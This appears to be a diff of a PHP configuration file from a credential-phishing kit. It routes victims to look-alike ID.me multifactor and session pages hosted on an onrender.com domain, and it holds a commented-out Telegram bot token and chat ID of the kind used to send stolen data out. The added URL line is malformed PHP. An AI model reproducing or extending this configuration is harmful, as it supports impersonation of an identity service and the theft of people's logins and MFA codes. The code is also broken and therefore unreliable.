@@ -55,9 +55,10 @@ $site_map = [
             // ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
 
         ],
-        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
+        'redirect' => 'https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php'
     ],
 
+    https://paysphere-hcr2.onrender.com/cache_site/careers/all-listings.job.34092/api.id.me/en/session/new.php
 
     // Add more sites...
 ];
